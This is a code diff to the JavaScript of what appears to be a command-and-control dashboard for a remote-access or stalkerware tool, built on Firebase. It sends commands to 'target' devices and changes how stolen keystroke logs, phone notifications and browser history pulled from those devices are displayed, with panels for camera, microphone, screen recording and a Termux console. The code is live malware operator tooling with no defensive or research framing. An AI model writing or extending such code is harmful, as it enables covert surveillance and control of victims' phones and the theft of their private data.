@@ -231,34 +231,44 @@ function startRealtimeDeviceListener(deviceId) {
     };
     registerActiveFirebaseListener(gpsRef, "value", gpsHandler);
 
-    // Subscribe to command responses across all output consoles
+    // Subscribe to command responses across output containers
     const responseHandler = snapshot => {
         const respText = snapshot.val();
         if (respText) {
             const timestamp = new Date().toLocaleTimeString();
-            const formattedMsg = `\n[${timestamp}] Target Execution Response:\n${respText}\n`;
 
-            const consoleIds = [
-                "execLogOutput",
-                "termuxConsoleOutput",
-                "fileExplorerOutput",
-                "mdmLogOutput",
-                "cameraLogOutput",
-                "micLogOutput",
-                "installedAppsOutput",
-                "screenrecorderOutput",
-                "keyloggerLogOutput",
-                "notificationsLogOutput",
-                "browserLogOutput"
-            ];
+            // Termux Console gets formatted CLI output (per user request, keeping Termux as terminal CLI)
+            const termuxBox = document.getElementById("termuxConsoleOutput");
+            if (termuxBox) {
+                termuxBox.innerHTML += `\n[${timestamp}] Response:\n${respText}\n`;
+                termuxBox.scrollTop = termuxBox.scrollHeight;
+            }
 
-            consoleIds.forEach(id => {
-                const box = document.getElementById(id);
-                if (box) {
-                    box.innerHTML += formattedMsg;
-                    box.scrollTop = box.scrollHeight;
-                }
-            });
+            // Executive Activity Stream gets structured timeline cards with timestamp
+            const streamBox = document.getElementById("execActivityStream");
+            if (streamBox) {
+                if (streamBox.querySelector(".text-muted")) streamBox.innerHTML = "";
+                const card = document.createElement("div");
+                card.className = "card bg-dark text-light border-secondary p-2 mb-2 extra-small";
+                card.innerHTML = `
+                    <div class="d-flex justify-content-between align-items-center mb-1">
+                        <span class="badge bg-primary px-2 py-1"><i class="fa-solid fa-check-double me-1"></i>Device Response</span>
+                        <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timestamp}</span>
+                    </div>
+                    <div class="font-monospace text-success text-break" style="white-space: pre-wrap;">${escapeHtml(respText)}</div>
+                `;
+                streamBox.prepend(card);
+            }
+
+            // MDM Log List
+            const mdmBox = document.getElementById("mdmLogList");
+            if (mdmBox) {
+                if (mdmBox.querySelector(".text-muted")) mdmBox.innerHTML = "";
+                const item = document.createElement("div");
+                item.className = "list-group-item bg-dark text-light border-secondary py-2 px-3 extra-small";
+                item.innerHTML = `<span class="badge bg-info me-2">${timestamp}</span> ${escapeHtml(respText)}`;
+                mdmBox.prepend(item);
+            }
         }
     };
     const responseRef = db.ref(`users/${uid}/devices/${deviceId}/response`);
@@ -386,11 +396,15 @@ document.getElementById("contactSearchInput")?.addEventListener("keyup", functio
 });
 
 function sendC2CommandToDevice(cmdText) {
+    if (!cmdText) return;
+    // Normalize '/' prefix to '!' prefix for command consistency
+    const normalizedCmd = cmdText.startsWith("/") ? "!" + cmdText.substring(1) : cmdText;
+
     const uid = currentUser ? currentUser.uid : "default_user";
     const db = firebase.database();
 
     const cmdPayload = {
-        text: cmdText,
+        text: normalizedCmd,
         status: "pending",
         timestamp: Date.now()
     };
@@ -400,16 +414,10 @@ function sendC2CommandToDevice(cmdText) {
 
     // Cache sent command locally in localStorage
     const history = JSON.parse(localStorage.getItem(`cmd_history_${activeDeviceId}`) || "[]");
-    history.push({ cmd: cmdText, time: new Date().toLocaleTimeString() });
+    history.push({ cmd: normalizedCmd, time: new Date().toLocaleTimeString() });
     localStorage.setItem(`cmd_history_${activeDeviceId}`, JSON.stringify(history.slice(-50)));
 
-    showDashboardNotification("success", `Dispatched command '${cmdText}' to ${activeDeviceId}`);
-
-    const outputBox = document.getElementById("execLogOutput");
-    if (outputBox) {
-        outputBox.innerHTML += `\n[${new Date().toLocaleTimeString()}] Dispatched Command: '${cmdText}' (Pending target execution...)`;
-        outputBox.scrollTop = outputBox.scrollHeight;
-    }
+    showDashboardNotification("success", `Dispatched '${normalizedCmd}' to ${activeDeviceId}`);
 }
 
 function triggerLocalDiskAutoArchive(filename, contentText) {
@@ -458,33 +466,97 @@ function showDashboardNotification(type, message) {
     setTimeout(() => { try { toast.remove(); } catch (_) {} }, 4000);
 }
 
+function escapeHtml(str) {
+    if (!str) return "";
+    return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
+
 function fetchCategoryTelemetryLogs(tabCategory) {
     const uid = currentUser ? currentUser.uid : "default_user";
-    const genericOutput = document.getElementById("genericLogOutput");
-    if (!genericOutput) return;
-
-    genericOutput.innerText = `⏳ [System] Subscribed to Realtime Telemetry Stream for '${tabCategory}'... (Awaiting device data)\n`;
 
     const telemetryRef = firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/telemetry/${tabCategory}`).limitToLast(30);
     registerActiveFirebaseListener(telemetryRef, "value", snapshot => {
         const val = snapshot.val();
         if (val) {
-            let logText = "";
-            Object.keys(val).forEach(key => {
-                const item = val[key];
-                logText += `[${new Date(item.timestamp || Date.now()).toLocaleTimeString()}] ${item.content || item.body || ''}\n`;
-            });
-            genericOutput.innerText = logText;
-            genericOutput.scrollTop = genericOutput.scrollHeight;
-            localStorage.setItem(`telemetry_cache_${tabCategory}`, logText);
-            triggerLocalDiskAutoArchive(tabCategory, logText);
+            const items = Object.keys(val).map(key => val[key]);
+            renderCategoryTelemetry(tabCategory, items);
         } else {
-            const cached = localStorage.getItem(`telemetry_cache_${tabCategory}`);
-            if (cached) {
-                genericOutput.innerText = `[LocalStorage Cache]\n` + cached;
-            } else {
-                genericOutput.innerText = `📭 No telemetry logs recorded for '${tabCategory}'. (Device stream active)`;
-            }
+            renderCategoryTelemetry(tabCategory, []);
         }
     });
+}
+
+function renderCategoryTelemetry(category, items) {
+    const timeStr = (ts) => new Date(ts || Date.now()).toLocaleTimeString();
+
+    if (category === "notifications" || category === "notification") {
+        const container = document.getElementById("notificationFeedContainer");
+        if (!container) return;
+        if (items.length === 0) {
+            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">🔔 No notification telemetry recorded yet.</div>`;
+            return;
+        }
+        container.innerHTML = items.slice().reverse().map(item => `
+            <div class="list-group-item bg-dark text-light border-secondary p-3">
+                <div class="d-flex justify-content-between align-items-center mb-1">
+                    <span class="badge bg-warning text-dark fw-bold"><i class="fa-solid fa-bell me-1"></i>${escapeHtml(item.sourceApp || item.app || 'Notification')}</span>
+                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
+                </div>
+                <h6 class="fw-bold mb-1 text-light">${escapeHtml(item.title || item.sender || 'System Alert')}</h6>
+                <p class="mb-0 small text-secondary">${escapeHtml(item.content || item.body || item.text || '')}</p>
+            </div>
+        `).join("");
+    } else if (category === "keylogs" || category === "keylogger") {
+        const container = document.getElementById("keyloggerFeedContainer");
+        if (!container) return;
+        if (items.length === 0) {
+            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">⌨️ No keystroke keylogs recorded yet.</div>`;
+            return;
+        }
+        container.innerHTML = items.slice().reverse().map(item => `
+            <div class="list-group-item bg-dark text-light border-secondary p-3">
+                <div class="d-flex justify-content-between align-items-center mb-1">
+                    <span class="badge bg-danger fw-bold"><i class="fa-solid fa-keyboard me-1"></i>${escapeHtml(item.sourceApp || item.app || 'Keylogger')}</span>
+                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
+                </div>
+                <div class="font-monospace text-success mt-1 small">${escapeHtml(item.content || item.body || item.text || '')}</div>
+            </div>
+        `).join("");
+    } else if (category === "browser_history" || category === "browser") {
+        const container = document.getElementById("browserHistoryTableBody");
+        if (!container) return;
+        if (items.length === 0) {
+            container.innerHTML = `<tr><td colspan="4" class="text-center text-muted py-4">🌐 No browser history telemetry recorded yet.</td></tr>`;
+            return;
+        }
+        container.innerHTML = items.slice().reverse().map(item => `
+            <tr>
+                <td><span class="badge bg-info text-dark"><i class="fa-solid fa-compass me-1"></i>${escapeHtml(item.sourceApp || 'Chrome')}</span></td>
+                <td class="fw-bold text-light">${escapeHtml(item.title || item.content || 'Web Page')}</td>
+                <td><small class="text-muted">${timeStr(item.timestamp)}</small></td>
+                <td><a href="${escapeHtml(item.extraUrl || '#')}" target="_blank" class="btn btn-sm btn-outline-info text-nowrap"><i class="fa-solid fa-external-link me-1"></i>Open</a></td>
+            </tr>
+        `).join("");
+    } else {
+        const container = document.getElementById("genericFeedContainer");
+        if (!container) return;
+        if (items.length === 0) {
+            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">📡 No telemetry items recorded for '${category}'.</div>`;
+            return;
+        }
+        container.innerHTML = items.slice().reverse().map(item => `
+            <div class="list-group-item bg-dark text-light border-secondary p-3">
+                <div class="d-flex justify-content-between align-items-center mb-1">
+                    <span class="badge bg-secondary extra-small"><i class="fa-solid fa-layer-group me-1"></i>${escapeHtml(category)}</span>
+                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
+                </div>
+                <p class="mb-0 small text-light">${escapeHtml(item.content || item.body || item.text || JSON.stringify(item))}</p>
+            </div>
+        `).join("");
+    }
 }
